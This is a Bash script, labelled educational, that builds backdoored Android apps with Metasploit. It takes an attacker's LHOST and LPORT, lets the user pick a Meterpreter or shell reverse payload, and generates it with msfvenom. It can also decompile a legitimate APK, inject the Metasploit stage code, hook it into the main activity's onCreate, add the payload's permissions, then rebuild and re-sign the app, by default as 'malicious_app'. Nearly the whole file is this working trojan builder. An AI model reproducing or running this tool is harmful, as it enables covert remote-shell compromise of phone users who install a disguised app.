#!/usr/bin/env bash

# XDROID Framework v2.0
# A script for demonstrating Android APK modification concepts.
# Intended for educational and security research purposes only.
#
# Original script by BabyPunk.
# Modernized and refactored in 2025.

# --- Configuration & Constants ---
set -o pipefail # Exit on pipe failures
trap 'cleanup; exit 1' INT TERM # Graceful exit on Ctrl+C or kill

readonly SCRIPT_VERSION="v2.0"
readonly WORK_DIR=$(pwd)
readonly OUTPUT_DIR="${WORK_DIR}/output_apks"
readonly TOOLS_DIR="${WORK_DIR}/tools"
readonly LOG_FILE="${WORK_DIR}/xdroid.log"

# Modern color definitions using tput for better compatibility
readonly C_RESET=$(tput sgr0)
readonly C_RED=$(tput setaf 1)
readonly C_GREEN=$(tput setaf 2)
readonly C_YELLOW=$(tput setaf 3)
readonly C_BLUE=$(tput setaf 4)
readonly C_CYAN=$(tput setaf 6)
readonly C_BOLD=$(tput bold)

# --- Core Functions ---

# Print a formatted message
log_msg() {
    local color="$1"
    local level="$2"
    local message="$3"
    printf "${color}${C_BOLD}[%s]${C_RESET} ${message}\n" "$level"
}

# Cleanup function to stop services and remove temporary files on exit
cleanup() {
    log_msg "$C_YELLOW" "!" "Interruption detected. Cleaning up..."
    # Add any service stop commands if necessary, e.g., 'systemctl stop postgresql'
    # pkill -f "msfconsole" &>/dev/null
    rm -rf "${WORK_DIR}/payload" "${WORK_DIR}/original"
    log_msg "$C_RED" "EXIT" "Script terminated."
    exit 1
}

# Check for root privileges where necessary. It's better to run sudo for specific commands.
check_root() {
    if [[ $EUID -ne 0 ]]; then
        log_msg "$C_RED" "ERROR" "This script requires root privileges for dependency installation. Please run with sudo."
        exit 1
    fi
}

# Check for a stable internet connection
check_internet() {
    log_msg "$C_CYAN" "*" "Checking for internet connection..."
    if ! ping -c 1 google.com &>/dev/null; then
        log_msg "$C_RED" "FAIL" "No internet connection. This script requires internet access."
        cleanup
    fi
    log_msg "$C_GREEN" "OK" "Internet connection is active."
}

# Check for required dependencies
check_dependencies() {
    log_msg "$C_CYAN" "*" "Checking for required dependencies..."
    local missing_deps=()
    local deps=("msfconsole" "xterm" "zenity" "aapt" "apktool" "zipalign" "jarsigner")
    
    for dep in "${deps[@]}"; do
        if ! command -v "$dep" &>/dev/null; then
            log_msg "$C_RED" "X" "${dep} is not found."
            missing_deps+=("$dep")
        else
            log_msg "$C_GREEN" "✔" "${dep} is installed."
        fi
    done

    if [ ${#missing_deps[@]} -ne 0 ]; then
        log_msg "$C_YELLOW" "!" "Attempting to install missing dependencies..."
        # This assumes a Debian-based system (like Kali, Ubuntu).
        apt-get update -y
        apt-get install -y metasploit-framework xterm zenity aapt apktool zipalign default-jdk --fix-missing -qq
        
        # Re-check after installation attempt
        for dep in "${missing_deps[@]}"; do
             if ! command -v "$dep" &>/dev/null; then
                log_msg "$C_RED" "FATAL" "Failed to install ${dep}. Please install it manually and re-run the script."
                cleanup
             fi
        done
        log_msg "$C_GREEN" "OK" "All dependencies are now installed."
    fi
}

# Setup the working environment
setup_env() {
    log_msg "$C_CYAN" "*" "Setting up working directory..."
    mkdir -p "$OUTPUT_DIR"
    # Clear old log file
    >"$LOG_FILE"
    log_msg "$C_GREEN" "OK" "Output will be saved in ${OUTPUT_DIR}"
}

# Function to run a command with a spinner and log its output
run_command_with_spinner() {
    local message="$1"
    shift
    local cmd="$@"
    
    log_msg "$C_CYAN" "BUSY" "$message"
    
    # Run command in the background, redirecting output to the log file
    eval "$cmd" &>> "$LOG_FILE" &
    local pid=$!
    local spinner='|/-\'
    
    while ps -p $pid > /dev/null; do
        for (( i=0; i<${#spinner}; i++ )); do
            printf "\r${C_YELLOW} [%c] ${C_RESET}Processing..." "${spinner:$i:1}"
            sleep 0.1
        done
    done
    printf "\r%80s\r" " " # Clear the line

    # Wait for the command to finish and get its exit code
    wait $pid
    local exit_code=$?

    if [ $exit_code -ne 0 ]; then
        log_msg "$C_RED" "FAIL" "${message} failed. Check ${LOG_FILE} for details."
        cleanup
    else
        log_msg "$C_GREEN" "DONE" "${message} completed successfully."
    fi
}

# Generate a new keystore for signing if one doesn't exist
create_keystore() {
    local keystore_path="${TOOLS_DIR}/debug.keystore"
    if [ ! -f "$keystore_path" ]; then
        log_msg "$C_YELLOW" "!" "Keystore not found. Creating a new one..."
        mkdir -p "$TOOLS_DIR"
        local cmd="keytool -genkey -v -keystore ${keystore_path} -alias androiddebugkey -keyalg RSA -keysize 2048 -validity 10000 -storepass android -keypass android -dname \"CN=Android Debug,O=Android,C=US\""
        run_command_with_spinner "Generating new debug keystore" "$cmd"
    fi
}

# Sign the final APK file
sign_apk() {
    local apk_path="$1"
    local signed_apk_path="${apk_path/.apk/-signed.apk}"
    local keystore_path="${TOOLS_DIR}/debug.keystore"

    log_msg "$C_CYAN" "*" "Signing the APK..."
    
    # First, zipalign the APK
    local aligned_apk_path="${apk_path/.apk/-aligned.apk}"
    local align_cmd="zipalign -v 4 ${apk_path} ${aligned_apk_path}"
    run_command_with_spinner "Aligning APK" "$align_cmd"

    # Now sign the aligned APK
    local sign_cmd="jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore ${keystore_path} -storepass android ${aligned_apk_path} androiddebugkey"
    run_command_with_spinner "Signing with jarsigner" "$sign_cmd"
    
    mv "$aligned_apk_path" "$signed_apk_path"
    rm "$apk_path" # remove unsigned apk
    
    log_msg "$C_GREEN" "SUCCESS" "APK signed successfully: ${C_YELLOW}${signed_apk_path}"
    mv "$signed_apk_path" "$OUTPUT_DIR/"
}

# --- Main Script Logic ---
main() {
    clear
    cat << "EOF"
    
    ${C_GREEN}
     _  _  ____  ____   ___  _  _  ____ 
    ( \/ )(  _ \(  _ \ / __)( \/ )(  _ \
     )  (  )   / )   /( (__  )  (  )___/
    (_/\_)(_)\_)(_)\_) \___)(_/\_)(__)  
    
    ${C_CYAN}Android APK Modification Framework ${SCRIPT_VERSION}${C_RESET}
    ${C_RED}${C_BOLD}FOR EDUCATIONAL PURPOSES ONLY${C_RESET}
    
EOF
    
    check_root
    check_internet
    check_dependencies
    setup_env
    create_keystore

    # --- User Input ---
    local lhost=$(hostname -I | awk '{print $1}')
    local publicip=$(curl -s http://ipinfo.io/ip)
    LHOST=$(zenity --title="SET LHOST" --text="Your Local IP: ${lhost}\nYour Public IP: ${publicip}" --entry --entry-text="$lhost" --width=400 2>/dev/null)
    [[ -z "$LHOST" ]] && log_msg "$C_RED" "ERROR" "LHOST cannot be empty." && cleanup
    
    LPORT=$(zenity --title="SET LPORT" --text="Enter the listening port (e.g., 4444)" --entry --entry-text="4444" --width=400 2>/dev/null)
    [[ -z "$LPORT" ]] && log_msg "$C_RED" "ERROR" "LPORT cannot be empty." && cleanup
    
    PAYLOAD=$(zenity --list --title="CHOOSE PAYLOAD" --text="\nSelect a payload:" --radiolist \
    --column="Select" --column="Payload Option" \
    TRUE "android/meterpreter/reverse_tcp" \
    FALSE "android/meterpreter/reverse_http" \
    FALSE "android/meterpreter/reverse_https" \
    FALSE "android/shell/reverse_tcp" 2>/dev/null)
    [[ -z "$PAYLOAD" ]] && log_msg "$C_RED" "ERROR" "No payload selected." && cleanup

    APK_NAME=$(zenity --title="PAYLOAD NAME" --text="Enter the output file name (without .apk)" --entry --entry-text="malicious_app" --width=400 2>/dev/null)
    [[ -z "$APK_NAME" ]] && log_msg "$C_RED" "ERROR" "APK name cannot be empty." && cleanup
    
    # --- Mode Selection ---
    local choice=$(zenity --list --title="MODE" --text="Choose generation mode:" --radiolist \
    --column="Select" --column="Mode" \
    TRUE "Embed payload into an existing APK" \
    FALSE "Generate a standalone payload APK" 2>/dev/null)

    if [[ "$choice" == "Generate a standalone payload APK" ]]; then
        # --- Standalone APK Generation ---
        local msf_cmd="msfvenom -p ${PAYLOAD} LHOST=${LHOST} LPORT=${LPORT} -o ${WORK_DIR}/${APK_NAME}.apk"
        run_command_with_spinner "Generating standalone payload APK" "$msf_cmd"
        sign_apk "${WORK_DIR}/${APK_NAME}.apk"

    else
        # --- APK Embedding Logic ---
        local original_apk=$(zenity --title="SELECT ORIGINAL APK" --filename="${WORK_DIR}/" --file-selection --file-filter="*.apk" 2>/dev/null)
        [[ -z "$original_apk" ]] && log_msg "$C_RED" "ERROR" "No original APK selected." && cleanup

        # 1. Generate payload
        local payload_apk="${WORK_DIR}/payload_temp.apk"
        local msf_cmd="msfvenom -p ${PAYLOAD} LHOST=${LHOST} LPORT=${LPORT} -o ${payload_apk}"
        run_command_with_spinner "Generating payload for embedding" "$msf_cmd"

        # 2. Decompile both APKs
        run_command_with_spinner "Decompiling original APK" "apktool d -f -o \"${WORK_DIR}/original\" \"${original_apk}\""
        run_command_with_spinner "Decompiling payload APK" "apktool d -f -o \"${WORK_DIR}/payload\" \"${payload_apk}\""
        
        # 3. Inject payload code (smali)
        log_msg "$C_CYAN" "*" "Injecting payload logic (smali)..."
        local payload_smali_dir="${WORK_DIR}/payload/smali/com/metasploit/stage"
        local target_smali_dir="${WORK_DIR}/original/smali/com/metasploit/stage"
        mkdir -p "$(dirname "$target_smali_dir")"
        cp -r "$payload_smali_dir" "$target_smali_dir"
        
        # 4. Inject permissions and hooks into AndroidManifest.xml
        log_msg "$C_CYAN" "*" "Modifying AndroidManifest.xml..."
        # Find the main activity to hook
        local main_activity=$(grep -oP '<activity .*\s*android:name="\K[^"]+' "${WORK_DIR}/original/AndroidManifest.xml" | grep -E "$(grep -A 1 'android.intent.action.MAIN' ${WORK_DIR}/original/AndroidManifest.xml | grep -oP 'android:name="\K[^"]+')" | head -1)
        if [ -z "$main_activity" ]; then
            log_msg "$C_RED" "ERROR" "Could not automatically find the main launch activity. This method is not compatible with this APK."
            cleanup
        fi
        local activity_smali_path=$(echo "$main_activity" | sed 's/\./\//g')
        local smali_file_to_hook="${WORK_DIR}/original/smali/${activity_smali_path}.smali"

        if [ ! -f "$smali_file_to_hook" ]; then
            log_msg "$C_RED" "ERROR" "Smali file for main activity not found: ${smali_file_to_hook}. App may be obfuscated."
            cleanup
        fi

        # Add payload execution command to onCreate method
        local hook="invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V"
        sed -i "/\.method.*onCreate(Landroid\/os\/Bundle;)V/a \\n    ${hook}" "$smali_file_to_hook"

        # Add permissions
        local permissions_to_add=($(grep 'uses-permission' "${WORK_DIR}/payload/AndroidManifest.xml" | sed 's/^[ \t]*//'))
        for perm in "${permissions_to_add[@]}"; do
            if ! grep -q "$perm" "${WORK_DIR}/original/AndroidManifest.xml"; then
                sed -i "/<\/application>/i ${perm}" "${WORK_DIR}/original/AndroidManifest.xml"
            fi
        done
        log_msg "$C_GREEN" "DONE" "Manifest and smali hooking complete."

        # 5. Rebuild the APK
        run_command_with_spinner "Rebuilding the modified APK" "apktool b -o \"${WORK_DIR}/${APK_NAME}.apk\" \"${WORK_DIR}/original\""

        # 6. Sign the final APK
        sign_apk "${WORK_DIR}/${APK_NAME}.apk"

        # 7. Clean up intermediate files
        rm -rf "${WORK_DIR}/payload" "${WORK_DIR}/original" "${payload_apk}"
    fi

    log_msg "$C_BLUE" "COMPLETE" "Script finished. Check the ${OUTPUT_DIR} directory."
}

# --- Script Entrypoint ---
main
